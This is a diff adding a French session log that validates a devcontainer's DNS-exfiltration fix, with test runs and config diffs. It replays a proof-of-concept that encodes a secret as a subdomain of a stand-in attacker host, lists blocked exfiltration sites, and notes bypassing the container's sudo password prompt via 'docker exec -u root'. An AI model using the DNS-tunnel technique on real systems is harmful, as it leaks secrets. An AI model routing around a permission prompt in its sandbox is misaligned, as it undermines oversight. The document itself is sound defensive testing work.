@@ -432,3 +432,247 @@ code.claude.com), path-scoped to `/chrome/*` and `/docs/*` respectively.
 
 **Commit** : not committed yet (proposed at end of session, awaiting user
 confirmation).
+
+---
+
+## 4 — adversarial-validation
+
+**Date** : 2026-05-22
+**Files touched** :
+- `plans/devcontainer-security-hardening-v2/STATUS.md` (row session 4 flip + counter 3→4 + next focus)
+- `plans/devcontainer-security-hardening-v2/EXISTING.md` (threat model carryover : remove "audit-accepted reading" mention)
+- `plans/devcontainer-security-hardening-v2/LOG.md` (this entry)
+
+**What** : Gate de validation pure — aucune modification de code. Replay
+empirique du PoC #9 sur HEAD (commit `2cd3cd6`), sanity probes des
+critères 1/2/3 du threat model v1, exécution des deux suites de tests
+(`test-dns-strict.sh` + `test-firewall.sh`), diff statique pré-fix vs
+post-fix pour archive, observation passive de `mitmproxy-blocks.log`
+pendant la session. Tous les critères verts → v2 ferme.
+
+**Why** : ROLLOUT exige une gate empirique avant de déclarer v2 close.
+La session 3 a posé le fix structurel ; la session 4 prouve qu'il
+fonctionne sur container réel ET qu'il ne casse aucun workflow Claude
+Code légitime (`bridge.claudeusercontent.com`, `code.claude.com`, etc.).
+Le risque inverse — `❌` sur un host réel qui forcerait un allowlist
+post-hoc — est précisément ce que les sessions 1+2 ont voulu prévenir.
+
+**Decisions** :
+- _Diff main vs HEAD via baseline `2cd3cd6^..2cd3cd6`_ — main et HEAD
+  pointent tous deux sur `2cd3cd6` (le fix commit déjà merged dans main).
+  Le diff `main..HEAD` est donc vide ; la preuve baseline → fix se lit
+  sur `2cd3cd6^..2cd3cd6`.
+- _Rebuild v1 skipped_ — l'option "rebuild en mode v1 + replay PoC #9
+  pour preuve dynamique du gap baseline" était optionnelle dans le spec.
+  Le diff statique du commit (suppression `server=127.0.0.11` ligne 16
+  de `dnsmasq.conf` + ajout loop sibling-resolve dans `init-firewall.sh`
+  L289-329) est suffisant comme preuve archive ; la preuve dynamique de
+  closure est portée par le PoC #9 replay sur HEAD (REFUSED).
+- _test-firewall.sh lancé via skill watch-log (host execution)_ — le
+  baked script `/usr/local/bin/test-firewall.sh` nécessite root pour
+  `ipset test`, et sudo dans le container demande un password (par
+  design, critère 3 step 2). Délégation host via
+  `docker exec -u root <container>` bypasse le prompt sans compromettre
+  la posture (le user contrôle déjà le docker daemon).
+- _Pas de modification de code dans cette session_ — les `⚠️` détectés
+  par test-firewall.sh (wildcard parents `ocsp.msocsp.com`,
+  `vo.msecnd.net`) sont pré-existants et hors-scope v2. À noter pour
+  une future session "wildcard parent probes" (ajouter au
+  `tests/probes.txt` les feuilles connues), mais pas ici.
+
+**Gotchas** :
+- _`/etc/devcontainer-firewall/` retourne EACCES, pas EROFS_ — le spec
+  attendait Read-only file system (mount RO). Le mécanisme effectif est
+  Unix permissions (dir owned by root, no group write pour `node`).
+  L'effet sécurité est identique (write blocked). Pas une régression,
+  juste un détail de mécanisme à documenter pour les futurs gate runs.
+- _`test-dns-strict.sh` vit dans `templates/v2/tests/integration/`, pas
+  dans `/usr/local/bin/`_ — le spec session 4 anticipait un script baké
+  côté `/usr/local/bin/`. En réalité seul `test-firewall.sh` est baké
+  (par le Dockerfile). `test-dns-strict.sh` reste source-only et se
+  lance via `bash <path>` directement. Pas un problème, juste un écart
+  par rapport au spec.
+- _`/var/log/devcontainer-firewall/` n'existe pas_ — le spec mentionnait
+  cette dir pour les logs. Les logs effectifs sont
+  `/var/log/mitmproxy{.log,-blocks.log,-writes.log}` (lisibles par
+  `node` via l'appartenance au group `adm`). Sweep direct sans sudo
+  suffit.
+- _`set -e` + `docker exec` capture du RC_ — le script watch-log
+  initialement écrit avec `set -e` aurait avorté avant d'afficher le RC
+  si test-firewall.sh sortait non-zero. Remplacé par `set -uo pipefail`
+  + capture explicite `RC=$?`. test-firewall.sh sort 0 par design (les
+  ❌ sont informational, pas fatal — cf. son commentaire d'en-tête).
+
+**Tests** (runtime, on HEAD = `2cd3cd6`) :
+
+### PoC #9 replay (primary gate)
+
+```
+$ PAYLOAD=$(echo "secret-$$-$(date +%s)" | base64 | tr -d '=' | tr '+/' '-_')
+$ echo "payload: $PAYLOAD"
+payload: c2VjcmV0LTEyOTI1LTE3Nzk0ODc3MDQK
+$ dig +noall +comments "${PAYLOAD}.attacker.example.invalid" @127.0.0.53
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: REFUSED, id: 30713
+;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 1232
+; EDE: 14 (Not Ready)
+```
+
+→ **PASS** : `status: REFUSED` + `EDE: 14 (Not Ready)` (dnsmasq signale
+proprement "no upstream available", la définition exacte de la closure
+gap #9).
+
+Sweep payload sur les 3 mitmproxy logs (lus directement, group `adm`) :
+
+```
+$ for f in /var/log/mitmproxy.log /var/log/mitmproxy-blocks.log /var/log/mitmproxy-writes.log; do
+    grep -c "c2VjcmV0LTEyOTI1LTE3Nzk0ODc3MDQK" "$f"
+  done
+0
+0
+0
+```
+
+→ **PASS** : payload absent des 3 logs sortants. Aucune trace, aucune
+exfil possible.
+
+### Sanity probes critères 1/2/3
+
+```
+$ touch /etc/devcontainer-firewall/probe-$$
+touch: cannot touch '/etc/devcontainer-firewall/probe-14145': Permission denied
+
+$ sudo -n true
+sudo: a password is required
+
+$ grep -E "^server=" /etc/devcontainer-firewall/dnsmasq.conf || echo "OK: no default server= line"
+OK: no default server= line
+
+$ grep "claude-bridge" /var/run/devcontainer-firewall/dnsmasq-domains.conf
+10:ipset=/claude-bridge/allowed-domains
+81:# Injected by init-firewall.sh — claude-bridge sidecar (UniClaudeProxy).
+82:server=/claude-bridge/127.0.0.11
+84:cname=claude-bridge.local,claude-bridge
+
+$ bash -n /usr/local/bin/init-firewall.sh && echo "OK"
+OK
+```
+
+→ **PASS** : critère 1 (config tamper resistance : pas de write to
+`/etc/devcontainer-firewall/` même par `node`), critère 2 (override
+claude-bridge correctement émis au runtime malgré cloud mode), critère
+3 (sudo password-required + init-firewall.sh syntax clean dans
+`/usr/local/bin/`).
+
+### `test-dns-strict.sh` (in-container)
+
+```
+$ bash /workspace/templates/v2/tests/integration/test-dns-strict.sh
+=== test-dns-strict.sh ===
+  ✓ test_allowlisted_anthropic_resolves      :: dig api.anthropic.com → returns IPv4
+  ✓ test_hostdockerinternal_resolves         :: dig host.docker.internal → returns IPv4
+  ✓ test_poc9_evil_subdomain_refused         :: PoC #9 → REFUSED (no upstream leak)
+  ✓ test_session2_bridge_resolves            :: dig bridge.claudeusercontent.com → returns IPv4
+  ✓ test_session2_codedocs_resolves          :: dig code.claude.com → returns IPv4
+  ⊘ test_sibling_claudebridge_resolves_when_active — skipped : cloud mode
+  ✓ test_unlisted_random_refused             :: dig random-*.example.invalid → REFUSED
+
+--- 6 pass / 0 fail / 1 skip ---
+```
+
+→ **PASS** : 6/0/1 conforme au critère (skip toléré en cloud mode).
+
+### `test-firewall.sh` (host execution via watch-log, `docker exec -u root`)
+
+Voir log complet : `.devcontainer/pending/test-firewall-session4-1779488505.log`.
+Résumé verbatim :
+
+```
+=== test-firewall.sh — session 4 gate @ 2026-05-22T22:24:53Z ===
+=== container: 743d65b86220
+=== invocation: docker exec -u root 743d65b86220 /usr/local/bin/test-firewall.sh
+
+🔍 Running connectivity tests...
+ℹ️  claude-bridge — DNS-allowlisted but L4 not opted in (cloud mode, expected)
+ℹ️  ollama.internal — DNS-allowlisted but L4 not opted in (cloud mode, expected)
+✔ api.anthropic.com reachable
+✔ code.claude.com reachable                    ← session 2 pre-allowlist
+✔ bridge.claudeusercontent.com reachable       ← session 2 pre-allowlist
+✔ api.github.com / codeload / githubusercontent.com (15 subdomain probes) reachable
+✔ marketplace.visualstudio.com, gallerycdn.vsassets.io (15 probes), vsassets.io reachable
+✔ docs.anthropic.com, docs.ollama.com, registry.npmjs.org, registry.ollama.ai reachable
+✔ sentry.io, statsig.com, platform.claude.com, console.anthropic.com, ollama.com reachable
+✔ mcp-proxy.anthropic.com, update.code.visualstudio.com reachable
+✔ crl.microsoft.com, ocsp.digicert.com, crl3.digicert.com reachable
+✔ www.microsoft.com, vscode.blob.core.windows.net, wtf.blunt.sh reachable
+⚠️  ocsp.msocsp.com (wildcard parent — no A on bare ; add probe in tests/probes.txt)
+⚠️  vo.msecnd.net (wildcard parent — no A on bare ; add probe in tests/probes.txt)
+✔ example.com, example.org, google.com, duckduckgo.com blocked
+✔ pastebin.com, gist.runkit.io, 0x0.st, transfer.sh blocked
+✔ discord.com, hooks.slack.com blocked
+
+=== test-firewall.sh exit code: 0 ===
+```
+
+→ **PASS** : 0 `❌`, 2 `⚠️` (wildcard parents — pré-existant, pas une
+régression session 3), 2 `ℹ️` (cloud mode L4 opt-in — expected),
+**tous les blocked toujours blocked** (pastebin.com, transfer.sh, etc.),
+exit 0. Critère « zéro nouveau ❌ vs run pré-session-3 » respecté.
+
+### Diff statique (preuve baseline → HEAD)
+
+```
+$ git log --oneline main..HEAD
+(empty — main = HEAD = 2cd3cd6)
+
+$ git diff 2cd3cd6^..2cd3cd6 -- .devcontainer/firewall/dnsmasq.conf
+@@ -11,9 +11,14 @@ bind-interfaces
+ no-resolv
+ no-hosts
+
+-# Default upstream for non-listed domains: Docker's internal resolver
+-# (lets container names like theshop-db / redis / host.docker.internal resolve).
+-server=127.0.0.11
++# No default upstream — non-allowlisted queries return REFUSED, so a
++# subdomain-encoded payload (`dig $(base64 secret).attacker.com`) cannot
++# leak via Docker DNS → host DNS → public DNS hierarchy (gap #9 of the
++# v1 adversarial validation). Sibling Docker peers (claude-bridge etc.)
++# are resolved by per-host `server=/<name>/127.0.0.11` lines emitted at
++# boot from direct-tcp-allow.txt ; host.docker.internal is resolved by
++# the ollama block's `host-record=` directive — both injected by
++# init-firewall.sh into the generated dnsmasq-domains.conf.
+```
+
+`init-firewall.sh` L289-329 : ajout du bloc loop sibling-resolve sur
+`direct-tcp-allow.txt` (cf. §3 diff summary pour la version condensée).
+
+→ **PASS** : le commit `2cd3cd6` est bien le structural fix attendu ;
+suppression du catch-all + injection runtime correcte de l'override
+claude-bridge + loop générique.
+
+### Observation passive (mitmproxy-blocks.log)
+
+Monitor armé en parallèle sur tout nouveau host bloqué pendant la
+session :
+
+```
+$ tail -F -n0 /var/log/mitmproxy-blocks.log | grep -oE '"host":"[^"]+"' | sort -u
+(0 notification fired during the session writing)
+```
+
+→ **PASS** : aucun host légitime n'a été REFUSED pendant la fenêtre
+d'observation (durée effective de la session 4 ≈ 15 min). Pas
+d'allowlist post-hoc nécessaire — la pre-allowlist sessions 1+2 + la
+baked `domains.txt` couvrent intégralement les workflows Claude réels
+observés ce soir.
+
+### Outcome
+
+**Tous les critères verts** : gap #9 empiriquement fermé sur HEAD,
+critères 1/2/3 du threat model v1 toujours satisfaits, aucune
+régression sur les workflows Claude légitimes. **v2 ferme**.
+
+**Commit** : not committed yet (proposed at end of session, awaiting
+user confirmation).
